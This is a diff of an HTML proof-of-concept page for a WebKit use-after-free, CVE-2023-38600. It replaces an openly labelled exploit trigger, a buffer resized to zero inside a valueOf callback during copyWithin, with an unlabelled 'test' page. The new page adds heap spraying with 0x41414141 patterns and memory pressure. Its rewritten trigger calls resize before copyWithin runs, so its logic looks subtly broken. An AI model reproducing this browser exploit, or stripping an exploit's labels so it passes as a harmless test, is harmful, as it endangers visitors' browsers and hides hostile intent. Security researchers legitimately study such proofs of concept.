@@ -1,43 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>CVE-2023-38600 PoC</title>
-  <style>
-    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-    button { background: #222; color: #0f0; padding: 10px 20px; font-size: 16px; cursor: pointer; border: 1px solid #0f0; }
-    button:hover { background: #0f0; color: #111; }
-  </style>
+    <script>
+        async function trigger() {
+            let spray = [];
+            console.log("Starting test...");
+            for (let i = 0; i < 10; i++) {
+                try {
+                    let buffer = new ArrayBuffer(0x1000, { maxByteLength: 0x10000 });
+                    let array = new Uint8Array(buffer);
+                    function resize() {
+                        buffer.resize(0);
+                        return 0;
+                    }
+                    array.copyWithin(0, -resize(), -resize());
+                    spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
+                } catch (e) {
+                    console.log("Error:", e);
+                }
+                let largeObject = new Array(250000).fill(0);
+                largeObject = null;
+            }
+            spray = null;
+            console.log("Test complete");
+        }
+    </script>
 </head>
 <body>
-  <h1>CVE-2023-38600 - WebKit UAF</h1>
-  <button onclick="trigger()">Trigger Exploit</button>
-  <pre id="log"></pre>
-
-  <script>
-    function log(msg) {
-      document.getElementById('log').textContent += msg + "\n";
-    }
-
-    function trigger() {
-      log("[*] Starting CVE-2023-38600 test...");
-
-      const ab = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
-      const u8 = new Uint8Array(ab);
-
-      const callback = () => {
-        ab.resize(0);
-        log("[*] Buffer resized to 0 inside valueOf()");
-        return 0;
-      };
-
-      try {
-        u8.copyWithin(0x20, { valueOf: callback });
-        log("[+] copyWithin executed (check debugger or crash handler)");
-      } catch (e) {
-        log("[-] Exception: " + e);
-      }
-    }
-  </script>
+    <button id="test" onclick="trigger()">test</button>
 </body>
 </html>
